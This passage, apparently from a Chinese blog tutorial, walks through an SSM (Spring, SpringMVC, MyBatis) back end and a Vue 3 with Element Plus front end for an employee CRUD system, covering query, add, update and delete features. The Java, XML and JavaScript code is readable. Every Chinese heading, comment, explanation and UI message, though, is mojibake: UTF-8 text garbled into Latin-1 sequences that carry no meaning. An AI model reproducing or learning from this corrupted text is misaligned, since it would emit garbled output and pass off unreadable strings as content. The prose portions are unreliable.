getAllDept() {\n        return departmentMapper.selectByExample(null);\n    }\n}\n```\n\n#### Controller\n\n```java\n@Controller\npublic class EmployeeController {\n    @Autowired\n    EmployeeService employeeService;\n  \n\t\t......\n      \n    /**\n     * æŸ¥è¯¢æŒ‡å®šå‘˜å·¥\n     */\n    @RequestMapping(value = \"/emp/{empId}\", method = {RequestMethod.GET})\n    @ResponseBody\n    public Msg getEmployee(@PathVariable(\"empId\") Integer empId) {\n        Employee employee = employeeService.getEmp(empId);\n        return Msg.success().add(\"emp\", employee);\n    }\n\n    /**\n     * æ›´æ–°å‘˜å·¥ä¿¡æ¯\n     */\n    @RequestMapping(value = \"/update\", method = {RequestMethod.PUT})\n    @ResponseBody\n    public Msg updateEmployees(@RequestBody Employee employee) {\n        employeeService.updateEmp(employee);\n        return Msg.success();\n    }\n}\n```\n\n```java\n@Controller\npublic class DepartmentController {\n\n    @Autowired\n    DepartmentService departmentService;\n\n    /**\n     *æŸ¥è¯¢æ‰€æœ‰éƒ¨é—¨\n     */\n    @RequestMapping(value =\"/dept\",method = {RequestMethod.GET})\n    @ResponseBody\n    public Msg getDepartments() {\n        List<Department> dept = departmentService.getAllDept();\n        return Msg.success().add(\"dept\", dept);\n    }\n}\n```\n\n#### Mapper\n\n```java\npublic interface EmployeeMapper {\n\n\t\t......\n      \n    Employee selectByPrimaryKey(Integer empId);\n\n    int updateByPrimaryKey(Employee row);\n}\n```\n\n```xml\n<select id=\"selectByPrimaryKey\" parameterType=\"java.lang.Integer\" resultMap=\"BaseResultMap\">\n  select \n  <include refid=\"Base_Column_List\" />\n  from tb_emp\n  where emp_id = #{empId,jdbcType=INTEGER}\n</select>\n\n<sql id=\"Base_Column_List\">\n  emp_id, emp_name, gender, email, d_id\n</sql>\n\n<update id=\"updateByPrimaryKey\" parameterType=\"com.jianjian.crud.bean.Employee\">\n  update tb_emp\n  set emp_name = #{empName,jdbcType=VARCHAR},\n  gender = #{gender,jdbcType=INTEGER},\n  email = #{email,jdbcType=VARCHAR},\n  d_id = #{dId,jdbcType=INTEGER}\n  where emp_id = #{empId,jdbcType=INTEGER}\n</update>\n```\n\n```java\npublic interface DepartmentMapper {\n    List<Department> selectByExample(DepartmentExample example);\n}\n```\n\n```xml\n<select id=\"selectByExample\" parameterType=\"com.jianjian.crud.bean.DepartmentExample\" resultMap=\"BaseResultMap\">\n  select\n  <if test=\"distinct\">\n    distinct\n  </if>\n  <include refid=\"Base_Column_List\" />\n  from tb_dept\n  <if test=\"_parameter != null\">\n    <include refid=\"Example_Where_Clause\" />\n  </if>\n  <if test=\"orderByClause != null\">\n    order by ${orderByClause}\n  </if>\n</select>\n\n<sql id=\"Base_Column_List\">\n  dept_id, dept_name\n</sql>\n```\n\n### 5.æ·»åŠ æ•°æ®\n\n- ç‚¹å‡»â€œæ–°å¢â€å¼¹å‡ºå¯¹è¯æ¡†\n- å»æ•°æ®åº“ä¸­æŸ¥è¯¢éƒ¨é—¨åˆ—è¡¨ï¼Œæ˜¾ç¤ºåœ¨å¯¹è¯æ¡†å†…\n- å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œæ ¡éªŒ\n- ä¿å­˜è¾“å…¥æ•°æ®\n\n#### Service\n\n```java\npublic interface EmployeeService {\n\n\t\t......\n      \n    void addEmp(Employee employee);\n}\n\n```\n\n```java\n@Service\npublic class EmployeeServiceImpl implements EmployeeService {\n\n    @Autowired\n    EmployeeMapper employeeMapper;\n\n\t\t......\n\n    @Override\n    public void addEmp(Employee employee) {\n        employeeMapper.insert(employee);\n    }\n}\n```\n\n#### Controller\n\n```java\n@Controller\npublic class EmployeeController {\n    @Autowired\n    EmployeeService employeeService;\n\n\t\t......\n\n    /**\n     * æ·»åŠ å‘˜å·¥\n     */\n    @RequestMapping(value = \"/add\", method = {RequestMethod.POST})\n    @ResponseBody\n    public Msg addEmployees(@RequestBody Employee employee) {\n        employeeService.addEmp(employee);\n        return Msg.success();\n    }\n}\n```\n\n#### Mapper\n\n```java\npublic interface EmployeeMapper {\n\n\t\t......\n\n    int insert(Employee row);\n}\n```\n\n```xml\n<insert id=\"insert\" parameterType=\"com.jianjian.crud.bean.Employee\">\n  insert into tb_emp (emp_id, emp_name, gender, \n  email, d_id)\n  values (#{empId,jdbcType=INTEGER}, #{empName,jdbcType=VARCHAR}, #{gender,jdbcType=INTEGER}, \n  #{email,jdbcType=VARCHAR}, #{dId,jdbcType=INTEGER})\n</insert>\n```\n\n### 6.åˆ é™¤æ•°æ®\n\n- å•ä¸ªåˆ é™¤ï¼šç‚¹å‡»æŸæ¡ç”¨æˆ·çš„åˆ é™¤æŒ‰é’®ï¼Œå¼¹å‡ºæç¤ºæ¡†ï¼Œç‚¹å‡»ç¡®å®šå³å¯åˆ é™¤\n- æ‰¹é‡åˆ é™¤ï¼šé€‰æ‹©å¤šæ¡ç”¨æˆ·ï¼Œå†ç‚¹å‡»åˆ é™¤æŒ‰é’®ï¼Œå¼¹å‡ºæç¤ºæ¡†ï¼Œç‚¹å‡»ç¡®å®šå³å¯åˆ é™¤\n\n#### Service\n\n```java\npublic interface EmployeeService {\n\n\t\t......\n\n    void deleteEmp(Integer empId);\n\n    int deleteBatchEmp(List<Integer>  empIds);\n}\n```\n\n```java\n@Service\npublic class EmployeeServiceImpl implements EmployeeService {\n\n    @Autowired\n    EmployeeMapper employeeMapper;\n  \n\t\t......\n\n    @Override\n    public void deleteEmp(Integer empId) {\n         employeeMapper.deleteByPrimaryKey(empId);\n    }\n\n    @Override\n    public int deleteBatchEmp(List<Integer> empIds) {\n        return employeeMapper.deleteBatchByIds(empIds);\n    }\n}\n```\n\n#### Controller\n\n```java\n@Controller\npublic class EmployeeController {\n    @Autowired\n    EmployeeService employeeService;\n\n\t\t......\n\n    /**\n     * åˆ é™¤æŒ‡å®šå‘˜å·¥\n     */\n    @RequestMapping(value = \"/delete/{empId}\", method = {RequestMethod.DELETE})\n    @ResponseBody\n    public Msg deleteEmployee(@PathVariable(\"empId\") Integer empId) {\n        employeeService.deleteEmp(empId);\n        return Msg.success();\n    }\n    /**\n     * æ‰¹é‡åˆ é™¤å‘˜å·¥\n     */\n    @RequestMapping(value = \"/batch_delete\", method = {RequestMethod.DELETE})\n    @ResponseBody\n    public Msg deleteBatchEmployees(@RequestBody Map<String, Object> empIds) {\n        List<Integer> Ids = (List<Integer>) empIds.get(\"empIds\");\n        employeeService.deleteBatchEmp(Ids);\n        return Msg.success();\n    }\n}\n```\n\n#### Mapper\n\n```java\npublic interface EmployeeMapper {\n\n\t\t......\n      \n    int deleteByPrimaryKey(Integer empId);\n\n    int deleteBatchByIds(List<Integer> empIds);\n}\n```\n\n```xml\n<delete id=\"deleteByPrimaryKey\" parameterType=\"java.lang.Integer\">\n  delete from tb_emp\n  where emp_id = #{empId,jdbcType=INTEGER}\n</delete>\n\n<delete id=\"deleteBatchByIds\" parameterType=\"java.util.List\">\n  DELETE FROM tb_emp WHERE emp_id IN\n  <foreach collection=\"list\" item=\"empId\" open=\"(\" close=\")\" separator=\",\">\n    #{empId}\n  </foreach>\n</delete>\n```\n\n## ä¸‰ã€å‰ç«¯å®ç°\n\n### 1.é¡¹ç›®æ„å»º\n\n#### åˆ›å»ºvue3é¡¹ç›®\n\n```bash\n## åˆ›å»º\nvue create ssm-crud-front\n## å¯åŠ¨\ncd ssm-crud-front\nnpm run serve\n```\n\n#### å¼•å…¥ç›¸å…³ä¾èµ–\n\n##### elemen-plus\n\nå®‰è£…\n\n```bash\n## vue-cliå®‰è£…\nvue add element-plus\n\n## npmå®‰è£…\nnpm install element-plus --save\n```\nå¼•å…¥\n```javascript\n// main.js\n\nimport ElementPlus from 'element-plus'\nimport 'element-plus/dist/index.css'\nimport zhCn from 'element-plus/lib/locale/lang/zh-cn'//è®¾ç½®ä¸­æ–‡\n\nconst app = createApp(App)\napp.use(ElementPlus, {locale: zhCn}).mount('#app')\n```\n\n##### elemen-plus-icons\n\nå®‰è£…\n\n```bash\nnpm install @element-plus/icons-vue -S\n```\nå¼•å…¥\n```javascript\n// main.js\n\n//å…¨å±€å¯¼å…¥\nimport * as ElementPlusIconsVue from '@element-plus/icons-vue'\n\nconst app = createApp(App)\nfor (const [key, component] of Object.entries(ElementPlusIconsVue)) {\n  app.component(key, component)\n}\n```\n\n##### axios\n\n```bash\nnpm install axios -S\n\nimport axios from 'axios' #å“ªé‡Œä½¿ç”¨å“ªé‡Œå¯¼å…¥\n```\n\n##### router\n\nå®‰è£…\n\n```bash\n## vue-cliå®‰è£…\nvue add router\n\n## npmå®‰è£…\nnpm install vue-router -S\n```\nå¼•å…¥\n```javascript\n// main.js\n\nimport router from './router'\n\nconst app = createApp(App)\napp.use(router)\n```\n\n### 2.é¡¹ç›®é…ç½®\n\n#### main.js\n\n```javascript\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport router from './router'//è·¯ç”±\nimport ElementPlus from 'element-plus'//element-plus\nimport 'element-plus/dist/index.css'//element-plus\nimport zhCn from 'element-plus/lib/locale/lang/zh-cn'//element-plusä¸­æ–‡\nimport * as ElementPlusIconsVue from '@element-plus/icons-vue'//element-plus-icons\n\nconst app = createApp(App)\n\n//é…ç½®å…¨å±€icon\nfor (const [key, component] of Object.entries(ElementPlusIconsVue)) {\n    app.component(key, component)\n  }\n\napp.use(router).use(ElementPlus, {locale: zhCn}).mount('#app')\n```\n\n#### vue.config.js\n\n```javascript\n//è§£å†³è·¨åŸŸé—®é¢˜\nconst { defineConfig } = require('@vue/cli-service')\nmodule.exports = defineConfig({\n  transpileDependencies: true,\n  devServer: {\n\t  open: true,  // npm run serveåè‡ªåŠ¨æ‰“å¼€é¡µé¢\n\t  host: '0.0.0.0',  // åŒ¹é…æœ¬æœºIPåœ°å€(é»˜è®¤æ˜¯0.0.0.0)\n\t  port: 8084, // å¼€å‘æœåŠ¡å™¨è¿è¡Œç«¯å£å·\n\t  proxy: {// è§£å†³è·¨åŸŸé—®é¢˜\n\t\t  '/api': {\n\t\t\t  target: 'http://localhost:8080/', //åç«¯æ¥å£åŸŸå\n\t\t\t  changeOrigin: true,             //æ˜¯å¦è·¨åŸŸ\n\t\t\t  ws: true,                       //æ˜¯å¦ä»£ç† websockets\n\t\t\t  secure: false,                   //æ˜¯å¦httpsæ¥å£\n\t\t\t  pathRewrite: {                  //è·¯å¾„é‡ç½®\n\t\t\t\t  '^/api': ''\n\t\t\t  }\n\t\t  }\n\t  },\n  },\n})\n```\n\n#### router/index.js\n\n```javascript\nimport { createRouter, createWebHashHistory } from 'vue-router'\nimport CrudView from '../views/CrudView.vue'\nconst routes = [\n  {\n    path: '/',\n    name: 'home',\n    component: CrudView\n  },\n  {\n    path: '/about',\n    name: 'about',\n    // æ‡’åŠ è½½\n    component: () => import(/* webpackChunkName: \"about\" */ '../views/AboutView.vue')\n  }\n]\n\nconst router = createRouter({\n  history: createWebHashHistory(),\n  routes\n})\n\nexport default router\n```\n\n### 3.é¡µé¢æ„å»º\n\n#### ç»„ä»¶(components)\n\n##### Header\n\n```html\n<template>\n  <el-header class=\"header\">\n      <a href=\"/\" class=\"nav-link\">\n        <img class=\"nav-logo\" src=\"../assets/favicon.png\" alt=\"logo\"/>\n        <h2 class=\"nav-title\">SSM-VUE-CRUD</h2>\n      </a>\n    <el-button type=\"default\" size=\"default\" :plain=\"true\" @click=\"skipAbout()\">å…³äº</el-button>\n  </el-header>\n</template>\n\n<script setup>\nimport { useRouter } from \"vue-router\";\nimport { ElMessage} from \"element-plus\";\n\n\n//å…³äºé¡µè·³è½¬\nconst router = useRouter();\nconst skipAbout = () => {\n  // window.location.href='#/about';\n  // router.push({path:'about'})\n  router.push({ name: \"about\" }); //è·¯ç”±å\n  //å¼¹æ¡†æç¤º\n  ElMessage({\n    showClose: true,\n    message: \"è¿™æ˜¯æœ¬é¡¹ç›®çš„å…³äºé¡µé¢ï¼\",\n    center: true,\n    type: \"success\",\n  });\n};\n</script>\n\n<style scoped>\n.header {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  width: 100%;\n  border-bottom: 1px solid #eee;\n  min-width: 800px;\n}\n.nav-logo {\n  height: 45px;\n  width: 45px;\n  vertical-align: middle;\n  display: inline-block;\n}\n.nav-title {\n  /* font-size: 2rem; */\n  display: inline-block;\n  vertical-align: middle;\n  color: #79bbff;\n  padding-top: 10px;\n}\n</style>\n```\n\n##### Footer\n\n```html\n<template>\n<el-footer class=\"footer\"> \n    <span>SSM-VUE-CRUD Â©2022 Created by </span> \n    <a href=\"https://jwt1399.top\" style=\"text-decoration: none;color: #409eff;\"> jwt1399.top</a>\n </el-footer>\n</template>\n\n <style scoped>\n.footer {\n    /* æ˜¾ç¤ºåœ¨åº•éƒ¨*/\n    position: relative;\n    text-align: center; \n    width: 100%;\n    /* å‚ç›´å±…ä¸­*/\n    height: 60px;\n    line-height:60px;\n    background-color: #fff;\n    border-top:1px solid #E7E7E7;\n} \n</style>\n```\n\n#### é¡µé¢(views)\n\n##### App\n\n```html\n<template>\n  <Header/>\n  <router-view/>\n  <Footer/>   \n</template>\n\n<script setup>\nimport Header from '@/components/Header.vue'\nimport Footer from '@/components/Footer.vue'\n</script>\n\n<style>\n#app {\n  font-family: Avenir, Helvetica, Arial, sans-serif;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n</style>\n\n\n<!-- ä¸ä½¿ç”¨script setupè¯­æ³•ç³– -->\n<!-- <script>\nimport Header from '@/components/Header.vue'\nimport Footer from '@/components/Footer.vue'\nexport default {\n    components: {\n        Header,\n        Footer,\n    }\n}\n</script> -->\n```\n\n##### AboutView\n\n```html\n<template>\n  <div class=\"about\">\n    <h2>åŸºäºSSM-VUEå‰åç«¯åˆ†ç¦»çš„ CRUD ç³»ç»Ÿ</h2>\n    <h3>å‰ç«¯</h3>\n      <p>å¼€å‘æ¡†æ¶ï¼šVue3ã€Axiosã€Element Plus</p>\n      <p>è„šæ‰‹æ¶ï¼š@Vue/cli</p>\n      <p>åŒ…ç®¡ç†: npm</p>\n      <p>å¼€å‘å·¥å…·ï¼šVSCodeã€Chrome</p>\n    <h3>åç«¯</h3>\n      <p>å¼€å‘æ¡†æ¶ï¼šSpringã€SpringMVCã€Mybatis</p>\n      <p>æ•°æ®åº“ï¼šMySQL</p>\n      <p>åˆ†é¡µï¼š pagehelper</p>\n      <p>é€†å‘å·¥ç¨‹ï¼š Mybatis Generator</p>\n      <p>ä¾èµ–ç®¡ç†ï¼š Maven</p>\n      <p>å¼€å‘å·¥å…·ï¼šIDEA 2022.1ã€Navicat 16</p>\n  </div>\n</template>\n\n<style scoped>\n.about{\n  text-align: center;\n}\n</style>\n```\n\n##### CrudView\n\n```html\n<template>\n  <el-main>\n    <!--å‘˜å·¥åˆ—è¡¨-->\n    <div class=\"data-table\">\n      <el-table\n        :data=\"employeeList\"\n        border\n        style=\"width: 100%\"\n        v-loading=\"loading\"\n        @selection-change=\"handleSelectionChange\"\n      >\n        <el-table-column type=\"selection\"></el-table-column>\n        <el-table-column prop=\"empId\" label=\"id\" sortable></el-table-column>\n        <el-table-column prop=\"empName\" label=\"å§“å\"></el-table-column>\n        <el-table-column prop=\"gender\" label=\"æ€§åˆ«\" :formatter=\"formatterSex\"></el-table-column>\n        <el-table-column prop=\"email\" label=\"é‚®ç®±\"></el-table-column>\n        <el-table-column prop=\"department.deptName\" label=\"éƒ¨é—¨\"></el-table-column>\n        <!-- <el-table-column label=\"æ“ä½œ\"> -->\n        <el-table-column align=\"center\">\n          <template #header>\n            <el-button type=\"primary\" size=\"default\" @click=\"handleAdd()\">æ·»åŠ </el-button>\n            <el-button type=\"danger\" size=\"default\" @click=\"handleBatchDelete()\">åˆ é™¤</el-button>\n          </template>\n          <template #default=\"scope\">\n            <el-button\n              type=\"primary\"\n              size=\"large\"\n              :icon=\"Edit\"\n              @click=\"handleEdit(scope.$index, scope.row)\"\n              circle\n            >\n            </el-button>\n            <el-button\n              type=\"danger\"\n              size=\"large\"\n              :icon=\"Delete\"\n              @click=\"handleDelete(scope.$index, scope.row)\"\n              circle\n            >\n            </el-button>\n          </template>\n        </el-table-column>\n      </el-table>\n\n    </div>\n    <!--åˆ†é¡µ-->\n    <div class=\"table-pagination\">\n      <el-pagination\n        v-model:current-page=\"pageNum\"\n        v-model:page-size=\"pageSize\"\n        :page-sizes=\"[5, 10, 15, 20]\"\n        :small=\"small\"\n        :disabled=\"disabled\"\n        :background=\"background\"\n        layout=\"total, sizes, prev, pager, next, jumper\"\n        :total=\"total\"\n        @size-change=\"handleSizeChange\"\n        @current-change=\"handleCurrentChange\"\n      >\n      </el-pagination>\n    </div>\n  </el-main>\n\n  <!--ä¿®æ”¹/æ·»åŠ è¡¨å•-->\n  <el-dialog\n    v-model=\"dialogFormVisible\"\n    :title=\"editNameDisabled ? 'ä¿®æ”¹' : 'æ·»åŠ '\"\n    @close=\"dialogClose\">\n    <el-form\n      :model=\"EmpForm\"\n      :rules=\"rules\"\n      ref=\"formRef\"\n      label-position=\"right\"\n      label-width=\"80px\"\n      status-icon>\n      <el-form-item label=\"å§“å\" prop=\"empName\">\n        <el-input v-model=\"EmpForm.empName\" :disabled=\"editNameDisabled\"></el-input>\n      </el-form-item>\n      <el-form-item label=\"é‚®ç®±\" prop=\"email\">\n        <el-input v-model=\"EmpForm.email\"></el-input>\n      </el-form-item>\n      <el-form-item label=\"æ€§åˆ«\" prop=\"gender\">\n        <el-radio-group v-model=\"EmpForm.gender\">\n          <el-radio :label=\"1\" border size=\"default\">ç”·</el-radio>\n          <el-radio :label=\"2\" border size=\"default\">å¥³</el-radio>\n        </el-radio-group>\n      </el-form-item>\n      <el-form-item label=\"æ‰€å±éƒ¨é—¨\" prop=\"dId\">\n        <el-select v-model=\"EmpForm.dId\" placeholder=\"è¯·é€‰æ‹©éƒ¨é—¨\">\n            <el-option v-for=\"(item,index) in DeptList\" :key=\"index\" :label=\"item.deptName\" :value=\"item.deptId\"> \n            </el-option>\n        </el-select>\n      </el-form-item>\n    </el-form>\n    <template #footer>\n      <span class=\"dialog-footer\">\n        <el-button @click=\"resetForm\">å–æ¶ˆ</el-button>\n        <el-button @click=\"SubmitForm\" type=\"primary\" >ç¡®å®š</el-button>\n      </span>\n    </template>\n  </el-dialog>\n</template>\n\n<script setup>\nimport { ElMessage, ElMessageBox } from \"element-plus\";\nimport { ref, reactive } from \"vue\";\nimport { Search, Edit, Delete } from \"@element-plus/icons-vue\";\nimport axios from \"axios\";\n\n/**\n * åˆ†é¡µç›¸å…³\n */\nconst pageNum = ref(1);\nconst pageSize = ref(10);\nconst small = ref(false);\nconst background = ref(true);\nconst disabled = ref(false);\nconst total = ref(null);\nconst handleSizeChange = (val) => {//æ¯é¡µæ¡ç›®æ•°\n  console.log(`æ¯é¡µæ¡ç›®æ•°ï¼š${val}`);\n  getEmployeeList(pageNum.value, val);\n};\nconst handleCurrentChange = (val) => {//å½“å‰é¡µé¢\n  console.log(`å½“å‰é¡µé¢: ${val}`);\n  getEmployeeList(val, pageSize.value);\n};\n\n/**\n * å‘˜å·¥å¢åˆ æ”¹\n */\n// æ–°å¢æŒ‰é’®\nconst handleAdd = () => {\n    // getAllDept();\n    editNameDisabled.value = false;\n    dialogFormVisible.value = true;\n};\n//å‹¾é€‰æ¡†æ”¹å˜\nlet batchIds = [];\nconst handleSelectionChange = (val) => {\n  console.log(\"å‹¾é€‰çš„ä¿¡æ¯ï¼š\",val);\n  var arrs = [];\n  for (var i = 0; i < val.length; i++) {\n    arrs.push(val[i].empId);\n  }\n    batchIds = arrs;\n};\n// æ‰¹é‡åˆ é™¤æŒ‰é’®\nconst handleBatchDelete = () => {\n  ElMessageBox.confirm(\"æ­¤æ“ä½œå°†æ°¸ä¹…åˆ é™¤è¿™äº›ä¿¡æ¯, æ˜¯å¦ç»§ç»­?\", \"æç¤º\", {\n    confirmButtonText: \"ç¡®å®š\",\n    cancelButtonText: \"å–æ¶ˆ\",\n    type: \"warning\",\n  })\n  .then(() => {\n    batchDeleteEmp(batchIds);\n  })\n  .catch(() => {\n    ElMessage({\n      type: \"info\",\n      message: \"åˆ é™¤å–æ¶ˆ\",\n    });\n  });\n};\n// åˆ é™¤æŒ‰é’®\nconst handleDelete = (index, row) => {\n  console.log(index, row);\n  ElMessageBox.confirm(\"æ­¤æ“ä½œå°†æ°¸ä¹…åˆ é™¤è¯¥ä¿¡æ¯, æ˜¯å¦ç»§ç»­?\", \"æç¤º\", {\n    confirmButtonText: \"ç¡®å®š\",\n    cancelButtonText: \"å–æ¶ˆ\",\n    type: \"warning\",\n  })\n    .then(() => {\n      deleteEmployee(row.empId);\n    })\n    .catch(() => {\n      ElMessage({ type: \"info\", message: \"åˆ é™¤å–æ¶ˆ\" });\n    });\n};\n// ä¿®æ”¹æŒ‰é’®\nconst handleEdit = (index, row) => {\n  console.log(index, row);\n  getEmployee(row.empId);\n  // getAllDept();\n  editNameDisabled.value = true;\n  dialogFormVisible.value = true;\n\n};\n\n/**\n * axiosè¯·æ±‚\n */\n// æŸ¥è¯¢å•ä¸ªå‘˜å·¥ä¿¡æ¯\nconst EmpForm = ref({});//å­˜å‚¨å•ä¸ªå‘˜å·¥ä¿¡æ¯\nfunction getEmployee(empId) {\n  axios\n    .get(`api/ssm_crud_back/emp/${empId}`)\n    .then((response) => {\n        console.log(\"å•ä¸ªå‘˜å·¥ä¿¡æ¯ï¼š\",response.data);\n        EmpForm.value = response.data.data.emp;\n        console.log(EmpForm);\n    })\n    .catch((error) => {\n        console.log(error);\n    });\n}\n//è·å–æ‰€æœ‰å‘˜å·¥æ•°æ®\nconst employeeList = ref([]); //å‘˜å·¥åˆ—è¡¨\nconst loading = ref(true); //åŠ è½½åŠ¨ç”»\nfunction getEmployeeList(pageNum, pageSize) {\n  axios.get(\"api/ssm_crud_back/employees/\", {\n      params: {\n        pageNum: pageNum,\n        pageSize: pageSize,\n      },\n    })\n    .then(function (res) {\n      console.log(\"æ‰€æœ‰å‘˜å·¥ä¿¡æ¯ï¼š\" , res.data);\n      loading.value = false;\n      employeeList.value = res.data.data.pageInfo.list;\n      total.value = res.data.data.pageInfo.total;\n      pageSize = res.data.data.pageInfo.pageSize;\n      pageNum = res.data.data.pageInfo.pageNum;\n    })\n    .catch(function (error) {\n      console.log(error);\n    });\n}\n//æ€§åˆ«æ ¼å¼åŒ–\nconst formatterSex = (row, column) => {\n  return row.gender == 1 ? \"ç”·\" : \"å¥³\";\n};\n//åˆ é™¤å‘˜å·¥ä¿¡æ¯\nfunction deleteEmployee(empId) {\n  axios.delete(`api/ssm_crud_back/delete/${empId}`)\n    .then(res => {\n      if (res.data.code == 100) {\n        getEmployeeList(pageNum.value,pageSize.value);\n        ElMessage({ type: \"success\", message: \"åˆ é™¤æˆåŠŸ\" });\n      } else {\n        ElMessage({ type: \"error\", message: \"åˆ é™¤å¤±è´¥\" });\n      }\n    })\n    .catch(error => {\n      console.log(error);\n    });\n}\n// æ›´æ–°å‘˜å·¥ä¿¡æ¯\nfunction updateEmployee(params) {\n  axios.put(\"api/ssm_crud_back/update\", {...params})\n    .then(res => {\n        console.log(res.data)\n      if (res.data.code == 100) {\n        ElMessage({ type: \"success\", message: \"æ›´æ–°æˆåŠŸ\" });\n        getEmployeeList(pageNum.value,pageSize.value);\n      } else {\n        ElMessage({ type: \"error\", message: \"æ›´æ–°å¤±è´¥\" });\n      }\n    })\n    .catch(error => {\n      console.log(error);\n    });\n}\n//è·å–æ‰€æœ‰éƒ¨é—¨\nlet DeptList = ref({})//å­˜å‚¨éƒ¨é—¨ä¿¡æ¯\nfunction getAllDept() {\n  axios.get(\"api/ssm_crud_back/dept\")\n  .then(res => {\n      console.log(\"éƒ¨é—¨ä¿¡æ¯ï¼š\",res.data);\n      DeptList.value = res.data.data.dept;\n  })\n  .catch(error => {\n    console.log(error);\n  });\n}\n//æ‰¹é‡åˆ é™¤\nfunction batchDeleteEmp(empIds){\n    if (empIds.length == 0) {\n    ElMessage({\n      message: \"æœ€å°‘é€‰æ‹©ä¸€ä½å‘˜å·¥ï¼\",\n      type: \"warning\",\n    });\n    return;\n  }\n  axios.delete(\"api/ssm_crud_back/batch_delete/\", {data: {empIds: empIds}})\n  .then(res => {\n    ElMessage({\n      type: \"success\",\n      message: \"åˆ é™¤æˆåŠŸ\",\n    });\n    getEmployeeList(pageNum.value,pageSize.value);\n  })\n  .catch(error => {\n    ElMessage({\n      type: \"error\",\n      message: \"åˆ é™¤å¤±è´¥\",\n    });\n  });\n}\n//æ·»åŠ å‘˜å·¥ä¿¡æ¯\nfunction addEmployee(params) {\n  axios.post(\"api/ssm_crud_back/add\", {...params})\n  .then(res => {\n    console.log(\"æ·»åŠ \",res.data)\n    if (res.data.code == 100) {\n        ElMessage({ type: \"success\", message: \"æ·»åŠ æˆåŠŸ\" });\n        getEmployeeList(pageNum.value,pageSize.value);\n        return;\n    }\n    ElMessage({ type: \"error\", message: \"æ·»åŠ å¤±è´¥\" });\n  })\n  .catch(error => {\n    console.log(error);\n  })\n}\n\n/**\n * setupé˜¶æ®µæ‰§è¡Œå‡½æ•°\n */\n//è°ƒç”¨è·å–æ‰€æœ‰éƒ¨é—¨\ngetAllDept()\n//è°ƒç”¨è·å–æ‰€æœ‰å‘˜å·¥\ngetEmployeeList(pageNum.value,pageSize.value);\n\n/**\n * ä¿®æ”¹/æ·»åŠ å¯¹è¯æ¡†ç›¸å…³\n */\n//æ˜¾ç¤º/éšè—å¯¹è¯æ¡†\nlet dialogFormVisible = ref(false);\n//åå­—æ˜¯å¦å¯ç¼–è¾‘\nlet editNameDisabled = ref(false);\n//è·å–è¡¨å•domå…ƒç´ \nlet formRef = ref(null);\n//å¯¹è¯æ¡†å–æ¶ˆæŒ‰é’®\nfunction resetForm() {\n  formRef.value.resetFields();\n  dialogFormVisible.value = false;\n}\n//å¯¹è¯æ¡†å…³é—­\nfunction dialogClose() {\n  formRef.value.resetFields();\n}\n//å¯¹è¯æ¡†ç¡®å®šæŒ‰é’®\nfunction SubmitForm() {\n  formRef.value.validate((valid) => {//è¡¨å•éªŒè¯\n    if (valid) {\n      if (editNameDisabled.value) {\n        updateEmployee(EmpForm.value);\n      } else {\n        addEmployee(EmpForm.value);\n      }\n      dialogFormVisible.value = false;\n    }\n  })\n}\n//å¯¹è¯æ¡†è¡¨å•éªŒè¯\nconst rules = reactive({\n  empName: [\n    {\n      required: true,\n      message: \"è¯·è¾“å…¥å§“å\",\n      trigger: \"blur\",\n    },\n    {\n      min: 1,\n      max: 15,\n      message: \"é•¿åº¦åº”è¯¥1 ï½ 15\",\n      trigger: \"blur\",\n    },\n  ],\n  email: [\n    {\n      required: true,\n      message: \"è¯·è¾“å…¥æ­£ç¡®é‚®ç®±\",\n      trigger: \"blur\",\n      pattern: /^[A-Za-z0-9\\u4e00-\\u9fa5]+@[a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+$/,\n    },\n  ],\n  gender: [\n    {\n      required: true,\n      message: \"è¯·é€‰æ‹©æ€§åˆ«\",\n      trigger: \"blur\",\n    },\n  ],\n  dId: [\n    {\n      required: true,\n      message: \"è¯·é€‰æ‹©éƒ¨é—¨\",\n      trigger: \"blur\",\n    },\n  ],\n  department: [\n    {\n      required: true,\n      message: \"è¯·é€‰æ‹©éƒ¨é—¨\",\n      trigger: \"blur\",\n    },\n  ],\n});\n</script>\n\n<style scoped>\n.table-pagination {\n  display: flex;\n  justify-content: center;\n  padding: 20px;\n}\n</style>\n```\n\n\n\n## å‚è€ƒ\n\n- [Vue SSMæ­å»ºä¸€ä¸ªç®€å•çš„Demoå‰åç«¯åˆ†ç¦»å«å¢åˆ æ”¹æŸ¥(CRUD)ã€åˆ†é¡µã€æ‰¹é‡åŠŸèƒ½](https://blog.csdn.net/jianyuwuyi/article/details/107924066)\n\n- [SSMå®ç°CRUDï¼ˆå‰åç«¯åˆ†ç¦»ï¼‰](https://blog.csdn.net/qq_41307110/article/details/123868778)\n\n- [SSM+VUEå®ç°åˆ†é¡µåŠŸèƒ½](https://mp.weixin.qq.com/s/dGAT5C9m0oANB38tVhTfKA)\n\n- [SSM + VUE å®ç°ç®€å•çš„ CRUD](https://www.cnblogs.com/l-y-h/p/12030104.html)\n- [SSM-CRUD SSM+VUEç‰ˆæœ¬ (å°šç¡…è°·æ•™ç¨‹)](https://blog.csdn.net/weixin_45454773/article/details/122931487)\n- [SSM æ¡†æ¶æ•´åˆæ¡ˆä¾‹ Â· è¯­é›€ (yuque.com)](https://www.yuque.com/jyunkai/ssm/gumcba#JsHAE)\n\n\n\n\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  